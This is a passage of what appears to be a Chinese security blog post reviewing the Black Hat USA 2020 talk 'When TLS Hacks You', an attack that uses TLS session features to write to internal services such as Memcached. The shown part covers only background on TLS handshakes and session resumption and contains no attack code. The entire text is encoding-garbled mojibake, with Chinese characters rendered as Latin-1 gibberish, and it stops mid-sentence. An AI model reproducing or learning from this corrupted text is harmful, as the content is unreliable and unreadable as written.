æœ¬æ–‡æ˜¯ä¸å¯èƒ½å®Œå…¨è¯»æ‡‚çš„ï¼Œæœ¬æ–‡çš„å†…å®¹ä¹Ÿå¹¶éå®Œå…¨æ­£ç¡®ï¼Œæ‰€ä»¥ä¹Ÿå¸Œæœ›å¤§å®¶æŠ±ç€æ€€ç–‘çš„æ€åº¦åˆç†å¯¹æ–‡ç« æå‡ºè´¨ç–‘ã€‚\næœ¬æ–‡ä¸»è¦æ˜¯å¯¹ Black Hat USA 2020 - When TLS Hacks You è®®é¢˜çš„æ•´ç†ä¸å¤ç›˜ï¼Œè¯¥æ”»å‡»æ˜¯ä¸€ç§åˆ©ç”¨ TLS åè®®ç‰¹æ€§ç»“åˆå®¢æˆ·ç«¯å®ç°ç¼ºé™·è¾¾åˆ°æ”»å‡»å†…ç½‘åº”ç”¨çš„æ”»å‡»æ–¹å¼ï¼Œå¯ä»¥è¾¾åˆ°ä»»æ„å†™å…¥ Memcached ç­‰å†…ç½‘æœåŠ¡çš„æ”»å‡»æ•ˆæœï¼Œè¿›è€Œé…åˆå…¶ä»–æ¼æ´é€ æˆ RCE ç­‰å±å®³ã€‚\nè¿™æ˜¯å»å¹´çš„åœ¨ black hat USA æå‡ºçš„ä¸€é¡¹æ”»å‡»æ–¹å¼ï¼Œä½†æ˜¯ä½œè€…åœ¨æå‡ºè¿™ä¸ªæ”»å‡»æ–¹å¼åï¼Œç”±äºç§ç§å› ç´ ï¼Œä»–æ”¾å‡ºæ¥çš„ demo å¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ‰€ä»¥åœ¨å¯¹è¯¥é¡¹çš„ç ”ç©¶å¤ç°ä¸­æ•´ç†äº†å¾ˆå¤šæ”»å‡»ç»†èŠ‚ï¼Œä»¥åŠä¸€äº›å¯ä»¥æ‹“å±•çš„åœ°æ–¹ï¼Œè¿˜æœ‰ä¸€äº›å…³äºè®¡ç®—æœºç§‘å­¦çŸ¥è¯†çš„æ¢ç´¢ã€‚\næœ¬æ–‡ä¸»è¦åˆ†æˆä¸‰éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†ä¸»è¦ç®€å•è®²è¿°ä¸€äº›å¿…è¦çš„èƒŒæ™¯çŸ¥è¯†ï¼Œç¬¬äºŒéƒ¨åˆ†ä¼šè¯¦ç»†è®°å½•ä¸‰ç§æ”»å‡»æ–¹å¼çš„å®ç°æ­¥éª¤ï¼Œç¬¬ä¸‰éƒ¨åˆ†ä¼šè®²è¿°ä¸€äº›å…³äºåœ¨å¤ç°è¿‡ç¨‹ä¸­çš„ä¸€äº›æ€è€ƒä»¥åŠç›¸å…³æ¢ç´¢çš„å†…å®¹ã€‚å¦‚æœè¿˜æœ‰åç»­çš„è¿›å±•ï¼Œæˆ‘ä¹Ÿä¼šåŒæ­¥åˆ°è‡ªå·±çš„ä¸ªäººåšå®¢ä¸Šï¼Œæ¬¢è¿å…³æ³¨ï¼Œä»¥åŠå‰æ¥äº¤æµï¼šhttps://blog.zeddyu.info/\nå¦‚æœå¯¹è¯¥ç¯‡æ–‡ç« æœ‰ä»»ä½•ç–‘é—®æˆ–è€…è´¨ç–‘ï¼Œæ¬¢è¿æ¥ä¿¡ï¼šecho emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d\næ¬¢è¿å¯¹åè®®å®‰å…¨ç­‰å†…å®¹æ„Ÿå…´è¶£çš„åŒå­¦ä¸€èµ·äº¤æµå­¦ä¹ ï¼\nPS: å¦‚æ— ç‰¹æ®Šè¯´æ˜ï¼Œæ•´ä¸ªå®éªŒèƒŒæ™¯å‡åŸºäº Ubuntu 20.04 LTS ï¼Œcurl 7.68.0 build with OpenSSL/1.1.1f ï¼Œåæ–‡æåˆ°çš„ IPv6 å‡æŒ‡çš„æ˜¯ IPv4-mapped IPv6 addresses è¿™ç±»åœ°å€\nBackground TLS Overview ä¼ è¾“å±‚å®‰å…¨æ€§åè®®ï¼ˆè‹±è¯­ï¼šTransport Layer Securityï¼Œç¼©å†™ï¼šTLSï¼‰åŠå…¶å‰èº«å®‰å…¨å¥—æ¥å±‚ï¼ˆè‹±è¯­ï¼šSecure Sockets Layerï¼Œç¼©å†™ï¼šSSLï¼‰æ˜¯ä¸€ç§å®‰å…¨åè®®ï¼Œç›®çš„æ˜¯ä¸ºäº’è”ç½‘é€šä¿¡æä¾›å®‰å…¨åŠæ•°æ®å®Œæ•´æ€§ä¿éšœã€‚ç½‘æ™¯å…¬å¸ï¼ˆNetscapeï¼‰åœ¨1994å¹´æ¨å‡ºé¦–ç‰ˆç½‘é¡µæµè§ˆå™¨ï¼ç½‘æ™¯å¯¼èˆªè€…æ—¶ï¼Œæ¨å‡ºHTTPSåè®®ï¼Œä»¥SSLè¿›è¡ŒåŠ å¯†ï¼Œè¿™æ˜¯SSLçš„èµ·æºã€‚IETFå°†SSLè¿›è¡Œæ ‡å‡†åŒ–ï¼Œ1999å¹´å…¬å¸ƒTLS 1.0æ ‡å‡†æ–‡ä»¶ï¼ˆRFC 2246ï¼‰ã€‚éšååˆå…¬å¸ƒTLS 1.1ï¼ˆRFC 4346ï¼Œ2006å¹´ï¼‰ã€TLS 1.2ï¼ˆRFC 5246ï¼Œ2008å¹´ï¼‰å’ŒTLS 1.3ï¼ˆRFC 8446ï¼Œ2018å¹´ï¼‰ã€‚åœ¨æµè§ˆå™¨ã€ç”µå­é‚®ä»¶ã€å³æ—¶é€šä¿¡ã€VoIPã€ç½‘ç»œä¼ çœŸç­‰åº”ç”¨ç¨‹åºä¸­ï¼Œå¹¿æ³›ä½¿ç”¨è¿™ä¸ªåè®®ã€‚è®¸å¤šç½‘ç«™ï¼Œå¦‚Googleã€Facebook ç­‰ä¹Ÿä»¥è¿™ä¸ªåè®®æ¥åˆ›å»ºå®‰å…¨è¿çº¿ï¼Œå‘é€èµ„æ–™ã€‚ç›®å‰å·²æˆä¸ºäº’è”ç½‘ä¸Šä¿å¯†é€šä¿¡çš„å·¥ä¸šæ ‡å‡†ã€‚\nNetscape å¼€å‘äº†åä¸ºå®‰å…¨å¥—æ¥å­—å±‚ï¼ˆSecure Socket Layerï¼ŒSSLï¼‰çš„ä¸Šä¸€ä»£åŠ å¯†åè®®ï¼ŒTLS ç”±æ­¤æ¼”å˜è€Œæ¥ã€‚TLS 1.0 ç‰ˆçš„å¼€å‘å®é™…ä¸Šå§‹äº SSL 3.1 ç‰ˆï¼Œä½†åè®®çš„åç§°åœ¨å‘å¸ƒä¹‹å‰è¿›è¡Œäº†æ›´åï¼Œä»¥è¡¨æ˜å®ƒä¸å†ä¸ Netscape å…³è”ã€‚ç”±äºè¿™ä¸ªå†å²åŸå› ï¼ŒTLS å’Œ SSL è¿™ä¸¤ä¸ªæœ¯è¯­æœ‰æ—¶ä¼šäº’æ¢ä½¿ç”¨ã€‚\nè¯¥åè®®ç”±ä¸¤å±‚ç»„æˆï¼š TLS è®°å½•åè®®ï¼ˆTLS Recordï¼‰å’Œ TLS æ¡æ‰‹åè®®ï¼ˆTLS Handshakeï¼‰ã€‚\nå› ä¸ºæœ¬æ–‡ä¾§é‡ç‚¹å¹¶é TLS æœ¬èº«çš„åŠ å¯†ç®—æ³•æµç¨‹ï¼Œæ‰€ä»¥ä¼šå¿½ç•¥å¾ˆå¤šå¯†ç ç®—æ³•æµç¨‹ï¼Œåªæå…¶ä¸­å¯¹æˆ‘ä»¬åç»­æ”»å‡»ç›¸å…³çš„éƒ¨åˆ†ï¼Œå¯†ç ç®—æ³•éƒ¨åˆ†æ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œæœç´¢äº†è§£ã€‚\nTLS Handshake TLS æ¡æ‰‹æ˜¯å¯åŠ¨ä½¿ç”¨ TLS åŠ å¯†çš„é€šä¿¡ä¼šè¯çš„è¿‡ç¨‹ã€‚åœ¨ TLS æ¡æ‰‹æœŸé—´ï¼Œä¸¤ä¸ªé€šä¿¡æ–¹äº¤æ¢æ¶ˆæ¯ä»¥ç›¸äº’ç¡®è®¤ï¼Œå½¼æ­¤éªŒè¯ï¼Œç¡®ç«‹å®ƒä»¬å°†ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ï¼Œå¹¶å°±ä¼šè¯å¯†é’¥è¾¾æˆå…±è¯†ã€‚å®ƒå®šä¹‰äº†æ¶ˆæ¯çš„æ ¼å¼å’Œäº¤æ¢çš„é¡ºåºã€‚è¿™äº›å¯ä»¥æ ¹æ®å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„éœ€æ±‚è€Œå˜åŒ–ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰å‡ ç§å¯èƒ½çš„ç¨‹åºæ¥å»ºç«‹è¿æ¥ã€‚åˆå§‹äº¤æ¢çš„ç»“æœæ˜¯TLSè¿æ¥æˆåŠŸï¼ˆåŒæ–¹éƒ½å‡†å¤‡å¥½ç”¨TLSä¼ è¾“åº”ç”¨æ•°æ®ï¼‰æˆ–å‘å‡ºè­¦æŠ¥æ¶ˆæ¯ã€‚\næ¯å½“ç”¨æˆ·é€šè¿‡ HTTPS å¯¼èˆªåˆ°ç½‘ç«™ï¼Œå¹¶ä¸”æµè§ˆå™¨é¦–å…ˆå¼€å§‹æŸ¥è¯¢ç½‘ç«™çš„æºç«™æœåŠ¡å™¨æ—¶ï¼Œéƒ½ä¼šè¿›è¡Œ TLS æ¡æ‰‹ã€‚æ¯å½“å…¶ä»–ä»»ä½•é€šä¿¡ä½¿ç”¨ HTTPSï¼ˆåŒ…æ‹¬ API è°ƒç”¨å’Œ HTTPS ä¸Šçš„ DNS æŸ¥è¯¢ï¼‰æ—¶ï¼Œä¹Ÿä¼šå‘ç”Ÿ TLS æ¡æ‰‹ã€‚é€šè¿‡ TCP æ¡æ‰‹æ‰“å¼€ TCP è¿æ¥åï¼Œå°†å‘ç”Ÿ TLS æ¡æ‰‹ã€‚\nåœ¨ TLS æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸€åŒæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\n æŒ‡å®šå°†è¦ä½¿ç”¨çš„ TLS ç‰ˆæœ¬ï¼ˆTLS 1.0ã€1.2ã€1.3 ç­‰ï¼‰ å†³å®šå°†è¦ä½¿ç”¨å“ªäº›å¯†ç å¥—ä»¶ é€šè¿‡æœåŠ¡å™¨çš„å…¬é’¥å’Œ SSL è¯ä¹¦é¢å‘æœºæ„çš„æ•°å­—ç­¾åæ¥éªŒè¯æœåŠ¡å™¨çš„èº«ä»½ ç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œä»¥åœ¨æ¡æ‰‹å®Œæˆåä½¿ç”¨å¯¹ç§°åŠ å¯† æ£€æŸ¥æ˜¯å¦éœ€è¦æ¢å¤ä¼šè¯  TLS æ¡æ‰‹æ˜¯ç”±å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº¤æ¢çš„ä¸€ç³»åˆ—æ•°æ®æŠ¥æˆ–æ¶ˆæ¯ã€‚TLS æ¡æ‰‹æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œå› ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è¦äº¤æ¢å®Œæˆæ¡æ‰‹å’Œè¿›è¡Œè¿›ä¸€æ­¥å¯¹è¯æ‰€éœ€çš„ä¿¡æ¯ã€‚ TLS æ¡æ‰‹çš„ç¡®åˆ‡æ­¥éª¤å°†æ ¹æ®æ‰€ä½¿ç”¨çš„å¯†é’¥äº¤æ¢ç®—æ³•çš„ç±»å‹ä»¥åŠåŒæ–¹æ”¯æŒçš„å¯†ç å¥—ä»¶è€Œæœ‰æ‰€ä¸åŒï¼ŒRSA å¯†é’¥äº¤æ¢ç®—æ³•æœ€ä¸ºå¸¸ç”¨ã€‚ä½†æ˜¯å¹¶éæ‰€æœ‰ TLS æ¡æ‰‹å‡ä½¿ç”¨éå¯¹ç§°åŠ å¯†ï¼ˆå…¬é’¥å’Œç§é’¥ï¼‰ï¼Œä½†å¹¶éå…¨éƒ½ä¼šåœ¨ç”Ÿæˆä¼šè¯å¯†é’¥çš„è¿‡ç¨‹ä¸­ä½¿ç”¨ç§é’¥ã€‚ä¾‹å¦‚ Diffie-Hellman æ¡æ‰‹ç­‰ï¼Œè¿™é‡Œä¸åšè¿‡å¤šä»‹ç»ã€‚\nTLS Record TLS Record åè®®ä½¿ç”¨æ¡æ‰‹è¿‡ç¨‹ä¸­åˆ›å»ºçš„å¯†é’¥æ¥ç¡®ä¿åº”ç”¨æ•°æ®çš„å®‰å…¨ã€‚è®°å½•åè®®è´Ÿè´£ä¿æŠ¤åº”ç”¨æ•°æ®çš„å®‰å…¨ï¼Œå¹¶éªŒè¯å…¶å®Œæ•´æ€§å’Œæ¥æºã€‚å®ƒç®¡ç†ä»¥ä¸‹å†…å®¹ï¼šå°†ä¼ å‡ºçš„æ¶ˆæ¯åˆ†ä¸ºå¯ç®¡ç†çš„å—ã€é‡æ–°ç»„åˆä¼ å…¥çš„æ¶ˆæ¯ã€å‹ç¼©å¤–å‘æŠ¥æ–‡å—å’Œè§£å‹æ¥æ”¶æŠ¥æ–‡å—ï¼ˆå¯é€‰ï¼‰ã€å°†ä¿¡æ¯éªŒè¯ç ï¼ˆMessage Authentication Code, MACï¼‰åº”ç”¨åˆ°å¤–å‘ä¿¡æ¯å¹¶ä½¿ç”¨ MAC éªŒè¯æ¥æ”¶ä¿¡æ¯ã€åŠ å¯†å¤–å‘æŠ¥æ–‡å’Œè§£å¯†æ¥æ”¶æŠ¥æ–‡ã€‚å½“ TLS Record åè®®å®Œæˆåï¼Œå¤–å‘åŠ å¯†æ•°æ®è¢«ä¼ åˆ°ä¼ è¾“æ§åˆ¶åè®®ï¼ˆTCPï¼‰å±‚è¿›è¡Œä¼ è¾“ã€‚\nTLS 1.2 TLS 1.2 HankShake ç”±äºå†å²åŸå› ï¼ŒTLS çš„å‰èº« SSL å·²ç»è¢«åºŸå¼ƒï¼›ç°è¡Œè¶‹åŠ¿ä¸­ï¼Œä¸»æµ TLS ç‰ˆæœ¬ä¸º 1.2 ï¼Œå¹¶ä¸” 1.2 å¯¹äº 1.1 çš„æ”¹åŠ¨ç›¸å¯¹äºæœ¬æ–‡é‡ç‚¹æ¥è¯´å¹¶ä¸é‡è¦ï¼Œå¹¶ä¸”ç°åœ¨å¤„äºæ¨å¹¿ 1.3 çš„æ—¶ä»£ï¼Œæˆ‘ä»¬è¿™é‡Œä» TLS 1.2 å¼€å§‹è®²èµ·ã€‚\n  Client hello: å®¢æˆ·ç«¯å‘é€ ClientHello æ¶ˆæ¯ï¼ŒæŒ‡å®šå®ƒæ”¯æŒçš„æœ€é«˜ TLS åè®®ç‰ˆæœ¬ã€ä¸€ä¸ªéšæœºæ•°ã€ä¸€ä¸ªå»ºè®®çš„å¯†ç å¥—ä»¶åˆ—è¡¨å’Œå»ºè®®çš„å‹ç¼©æ–¹æ³•ã€‚å¦‚æœå®¢æˆ·ç«¯è¯•å›¾æ‰§è¡Œæ¢å¤æ¡æ‰‹ï¼Œå®ƒå¯èƒ½ä¼šå‘é€ä¸€ä¸ªä¼šè¯ ID ã€‚å¦‚æœå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨åº”ç”¨å±‚åè®®åå•†ï¼Œå®ƒå¯èƒ½åŒ…æ‹¬ä¸€ä¸ªæ”¯æŒçš„åº”ç”¨åè®®åˆ—è¡¨ï¼Œä¾‹å¦‚ HTTP/2 ã€‚\n  Server hello: æœåŠ¡å™¨ä»¥ ServerHello æ¶ˆæ¯ä½œå‡ºå“åº”ï¼ŒåŒ…å«ä»å®¢æˆ·ç«¯æä¾›çš„é€‰æ‹©ä¸­é€‰æ‹©çš„åè®®ç‰ˆæœ¬ã€éšæœºæ•°ã€å¯†ç å¥—ä»¶å’Œå‹ç¼©æ–¹æ³•ã€‚ä¸ºäº†ç¡®è®¤æˆ–å…è®¸æ¢å¤æ¡æ‰‹ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘é€ä¸€ä¸ªä¼šè¯ ID ã€‚é€‰æ‹©çš„åè®®ç‰ˆæœ¬åº”è¯¥æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½æ”¯æŒçš„æœ€é«˜ç‰ˆæœ¬ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®¢æˆ·ç«¯æ”¯æŒ TLS 1.1 ç‰ˆæœ¬ï¼ŒæœåŠ¡å™¨æ”¯æŒ 1.2 ç‰ˆæœ¬ï¼Œåˆ™åº”é€‰æ‹© 1.1 ç‰ˆæœ¬ï¼›ä¸åº”é€‰æ‹© 1.2 ç‰ˆæœ¬ã€‚\n  (Optional) Certificate: æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€è¯ä¹¦æˆ–è¯ä¹¦é“¾ã€‚ è¯ä¹¦é“¾é€šå¸¸ä»¥æœåŠ¡å™¨çš„å…¬é’¥è¯ä¹¦å¼€å§‹ï¼Œå¹¶ä»¥è¯ä¹¦é¢å‘æœºæ„çš„æ ¹è¯ä¹¦ç»“æŸã€‚ è¯¥æ¶ˆæ¯æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯åœ¨éœ€è¦æœåŠ¡å™¨èº«ä»½éªŒè¯æ—¶ä½¿ç”¨ã€‚\n  (Optional) Certificate request: å¦‚æœæœåŠ¡å™¨å¿…é¡»å¯¹å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯ï¼Œåˆ™å®ƒå°†å‘å®¢æˆ·ç«¯å‘é€è¯ä¹¦è¯·æ±‚ã€‚ åœ¨Internetåº”ç”¨ç¨‹åºä¸­ï¼Œå¾ˆå°‘å‘é€æ­¤æ¶ˆæ¯ã€‚\n  (Optional) Server key exchange: å¦‚æœæ¥è‡ªè¯ä¹¦çš„å…¬é’¥ä¿¡æ¯ä¸è¶³ä»¥è¿›è¡Œå¯†é’¥äº¤æ¢ï¼Œåˆ™æœåŠ¡å™¨ä¼šå‘å®¢æˆ·ç«¯å‘é€æœåŠ¡å™¨å¯†é’¥äº¤æ¢æ¶ˆæ¯ã€‚ ä¾‹å¦‚ï¼Œåœ¨åŸºäºDiffie-Hellmanï¼ˆDHï¼‰çš„å¯†ç å¥—ä»¶ä¸­ï¼Œæ­¤æ¶ˆæ¯åŒ…å«æœåŠ¡å™¨çš„DHå…¬é’¥ã€‚\n  Server hello done: æœåŠ¡å™¨å‘Šè¯‰å®¢æˆ·ç«¯å®ƒå·²ç»å®Œæˆäº†å…¶åˆå§‹åå•†æ¶ˆæ¯ã€‚\n  (Optional)Certificate: å¦‚æœæœåŠ¡å™¨ä»å®¢æˆ·ç«¯è¯·æ±‚è¯ä¹¦ï¼Œåˆ™å®¢æˆ·ç«¯å°†å‘é€å…¶è¯ä¹¦é“¾ï¼Œå°±åƒæœåŠ¡å™¨ä¹‹å‰æ‰€åšçš„ä¸€æ ·ã€‚\nNote: åªæœ‰å°‘æ•°InternetæœåŠ¡å™¨åº”ç”¨ç¨‹åºè¦æ±‚å®¢æˆ·ç«¯æä¾›è¯ä¹¦ã€‚\n  Client key exchange: å®¢æˆ·ç«¯ç”Ÿæˆç”¨äºåˆ›å»ºç”¨äºå¯¹ç§°åŠ å¯†çš„å¯†é’¥çš„ä¿¡æ¯ã€‚ å¯¹äº RSA ï¼Œå®¢æˆ·ç«¯éšåä½¿ç”¨æœåŠ¡å™¨çš„å…¬å…±å¯†é’¥å¯¹è¯¥å¯†é’¥ä¿¡æ¯è¿›è¡ŒåŠ å¯†å¹¶å°†å…¶å‘é€åˆ°æœåŠ¡å™¨ã€‚ å¯¹äºåŸºäº DH çš„å¯†ç å¥—ä»¶ï¼Œæ­¤æ¶ˆæ¯åŒ…å«å®¢æˆ·ç«¯çš„ DH å…¬é’¥ã€‚\n  (Optional) Certificate verify: å¦‚å‰æ‰€è¿°ï¼Œå½“å®¢æˆ·ç«¯å‡ºç¤ºè¯ä¹¦æ—¶ï¼Œæ­¤æ¶ˆæ¯ç”±å®¢æˆ·ç«¯å‘é€ã€‚ å…¶ç›®çš„æ˜¯å…è®¸æœåŠ¡å™¨å®Œæˆå¯¹å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯çš„è¿‡ç¨‹ã€‚ ä½¿ç”¨æ­¤æ¶ˆæ¯æ—¶ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨åŠ å¯†å“ˆå¸Œå‡½æ•°å‘é€å…¶è¿›è¡Œæ•°å­—ç­¾åçš„ä¿¡æ¯ã€‚ å½“æœåŠ¡å™¨ä½¿ç”¨å®¢æˆ·ç«¯çš„å…¬å…±å¯†é’¥è§£å¯†æ­¤ä¿¡æ¯æ—¶ï¼ŒæœåŠ¡å™¨ä¾¿èƒ½å¤Ÿå¯¹å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯ã€‚\n  Change cipher spec: å®¢æˆ·ç«¯å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œå‘ŠçŸ¥æœåŠ¡å™¨æ›´æ”¹ä¸ºåŠ å¯†æ¨¡å¼ã€‚\n  Finished: å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡å™¨å·²å‡†å¤‡å¥½å¼€å§‹å®‰å…¨æ•°æ®é€šä¿¡ã€‚\n  Change cipher spec: æœåŠ¡å™¨å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œå‘ŠçŸ¥å®¢æˆ·ç«¯æ›´æ”¹ä¸ºåŠ å¯†æ¨¡å¼ã€‚\n  Finished: æœåŠ¡å™¨å‘Šè¯‰å®¢æˆ·ç«¯å®ƒå·²å‡†å¤‡å¥½å¼€å§‹å®‰å…¨æ•°æ®é€šä¿¡ï¼Œæ¡æ‰‹åˆ°æ­¤ç»“æŸã€‚\n  Encrypted data: å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä½¿ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•å’Œåœ¨å®¢æˆ·ç«¯é—®å€™å’ŒæœåŠ¡å™¨é—®å€™æœŸé—´åå•†çš„åŠ å¯†å“ˆå¸Œå‡½æ•°ï¼Œä»¥åŠä½¿ç”¨å®¢æˆ·ç«¯åœ¨å®¢æˆ·ç«¯å¯†é’¥äº¤æ¢æœŸé—´å‘é€ç»™æœåŠ¡å™¨çš„ç§˜å¯†å¯†é’¥è¿›è¡Œé€šä¿¡ã€‚ æ­¤æ—¶å¯ä»¥é‡æ–°åå•†æ¡æ‰‹ã€‚\n  Close Messages: åœ¨è¿æ¥ç»“æŸæ—¶ï¼ŒåŒæ–¹éƒ½ä¼šå‘é€ close_notify Alert æŠ¥æ–‡ï¼Œä»¥é€šçŸ¥å¯¹ç­‰æ–¹è¯¥è¿æ¥å·²å…³é—­ã€‚\n  å¤§è‡´æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º\n \nå¯¹äºä¸åŒçš„å¯†é’¥ç®—æ³•åˆä¼šäº§ç”Ÿç¨å¾®ä¸ä¸€è‡´çš„æµç¨‹ï¼Œè¿™é‡Œå¹¶ä¸ä½œä¸ºé‡ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸å†å±•å¼€æè¿°äº†ã€‚\nTLS 1.2 Session Resumption Overview å®Œæ•´çš„ TLS æ¡æ‰‹äº§ç”Ÿçš„é¢å¤–å»¶æ—¶å’Œè®¡ç®—æˆæœ¬å¯¹æ‰€æœ‰éœ€è¦å®‰å…¨é€šä¿¡çš„åº”ç”¨ç¨‹åºç‰ºç‰²äº†å¾ˆå¤šæ€§èƒ½ä»£ä»·ï¼Œä¸ºäº†å¸®åŠ©é™ä½éƒ¨åˆ†æˆæœ¬ï¼Œ TLS æä¾›äº†ä¸€ç§æœºåˆ¶æ¢å¤ä¼šè¯æœºåˆ¶ï¼Œç”¨æ¥æ¢å¤æˆ–å…±äº«å¤šä¸ªè¿æ¥ä¹‹é—´çš„ç›¸åŒåå•†çš„ç§˜é’¥æ•°æ®ã€‚ä¼šè¯æ¢å¤æ˜¯ä¸€ä¸ªé‡è¦çš„ä¼˜åŒ–éƒ¨ç½²ï¼Œç®€ç•¥çš„æ¡æ‰‹æ¶ˆé™¤äº†ä¸€ä¸ªå®Œæ•´çš„ TLS æ¡æ‰‹å¾€è¿”è€—æ—¶ï¼Œå¤§å¤§é™ä½äº†åŒæ–¹çš„è®¡ç®—æˆæœ¬ã€‚åœ¨ TLS 1.2 ä¸­ï¼Œ TLS Session Resumption å¯ä»¥é‡‡ç”¨ Session ID å’Œä¼šè¯ç¥¨æœºåˆ¶æ¥å®ç°ã€‚é™¤äº†æ€§èƒ½ä¸Šçš„ä¼˜åŠ¿å¤–ï¼Œæ¢å¤çš„ä¼šè¯è¿˜å¯ä»¥ç”¨äºå•ç‚¹ç™»å½•ï¼Œå› ä¸ºå®ƒä¿è¯äº†åŸå§‹ä¼šè¯å’Œä»»ä½•æ¢å¤çš„ä¼šè¯éƒ½æ¥è‡ªåŒä¸€ä¸ªå®¢æˆ·ç«¯ã€‚\nTLS 1.2 Session Resumption - Session ID åœ¨è¿™ç§æœºåˆ¶ä¸­ï¼ŒæœåŠ¡å™¨åœ¨ä¸å®¢æˆ·ç«¯åˆæ¬¡æ¡æ‰‹æ—¶ï¼ŒæœåŠ¡å™¨ä¼šéšæœºåˆ†é…ä¸€ä¸ª Session IDã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å°†è¿™ä¸ªä¼šè¯IDä¸ä¼šè¯å¯†é’¥å’Œè¿æ¥çŠ¶æ€ä¸€èµ·å­˜å‚¨ã€‚ä¸ºäº†æ¢å¤ä¼šè¯ï¼Œå®¢æˆ·ç«¯å°†å­˜å‚¨çš„ä¼šè¯IDä¸ç¬¬ä¸€ä¸ªåè®®æ¶ˆæ¯ï¼ˆClientHelloï¼‰ä¸€èµ·å‘é€ç»™æœåŠ¡å™¨ã€‚å¦‚æœæœåŠ¡å™¨è¯†åˆ«åˆ°äº†è¿æ¥å¹¶æ„¿æ„æ¢å¤ä¼šè¯ï¼Œå®ƒå°±ä¼šç”¨ç›¸åŒçš„ä¼šè¯IDæ¥å›å¤ï¼Œé‡æ–°å»ºç«‹å„è‡ªçš„ä¼šè¯ã€‚è¿™æ ·å°±å¯ä»¥å¿«é€Ÿå»ºç«‹å®‰å…¨çš„è¿æ¥ï¼Œè€Œä¸”ç”±äºæˆ‘ä»¬é‡ç”¨äº†ä¹‹å‰åå•†å¥½çš„ä¼šè¯æ•°æ®ï¼Œæ‰€ä»¥ä¸ä¼šæŸå¤±å®‰å…¨æ€§ã€‚\nClient åœ¨ä¸€å¼€å§‹å‘é€ ClientHello æ¶ˆæ¯ä¸­ï¼Œ ClientHello æ¶ˆæ¯ä¸­åŒ…æ‹¬ä¸€ä¸ªå¯å˜é•¿åº¦çš„ Session IDã€‚å¦‚æœä¸ºç©ºåˆ™è¡¨ç¤ºæ˜¯ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼ŒServer åœ¨è¿”å› ServerHello æ—¶å°±ä¼šå‘é€ä¸€ä¸ª Session ID ï¼Œæ­¤æ—¶å†…å®¹ä¸º Server äº§ç”Ÿï¼Œå½“åå•†æ¡æ‰‹å®Œæˆåï¼ŒSession ID å°±å˜å¾—æœ‰æ•ˆï¼Œå¹¶ä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°ç”±äºè¶…è¿‡æœ‰æ•ˆæ—¶é—´æˆ–å› ä¸ºåœ¨ä¸ä¼šè¯ç›¸å…³çš„è¿æ¥ä¸Šé‡åˆ°æœåŠ¡å™¨é”™è¯¯è€Œè¢«åˆ é™¤ã€‚å¦‚æœä¸ä¸ºç©ºï¼Œè¯¥å€¼å°±è¡¨ç¤ºå®¢æˆ·ç«¯å¸Œæœ›é‡ç”¨è¯¥ä¼šè¯çš„å®‰å…¨å‚æ•°ï¼ŒServer ä¼šæ£€æŸ¥å®ƒçš„ä¼šè¯ç¼“å­˜ä»¥è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œå¹¶ä¸” Server æ„¿æ„åœ¨æŒ‡å®šçš„ä¼šè¯çŠ¶æ€ä¸‹é‡å»ºè¿æ¥ï¼Œå®ƒå°†ä¼šå‘é€ä¸€ä¸ªå¸¦æœ‰ç›¸åŒä¼šè¯ ID å€¼çš„ ServerHello æ¶ˆæ¯ï¼Œè¿™æ—¶ Client å’Œ Server å¿…é¡»éƒ½å‘é€ ChangeCipherSpec æ¶ˆæ¯å¹¶ä¸”ç›´æ¥å‘é€ Finished æ¶ˆæ¯ï¼Œä¸€æ—¦é‡å»ºç«‹å®Œæˆï¼ŒClient å’Œ Server å¯ä»¥å¼€å§‹äº¤æ¢åº”ç”¨å±‚æ•°æ®ã€‚å¦‚æœä¸€ä¸ªä¼šè¯ ID ä¸åŒ¹é…ï¼ŒServer ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ä¼šè¯ IDï¼Œç„¶å TLS Client å’Œ Server éœ€è¦è¿›è¡Œä¸€æ¬¡å®Œæ•´çš„æ¡æ‰‹ã€‚\n Client Server ClientHello --------\u0026gt; ServerHello [ChangeCipherSpec] \u0026lt;-------- Finished [ChangeCipherSpec] Finished --------\u0026gt; Application Data \u0026lt;-------\u0026gt; Application Data Figure 2. Message flow for an abbreviated handshake åœ¨ RFC 5246 ä¸­ï¼Œå¯¹ SessionID 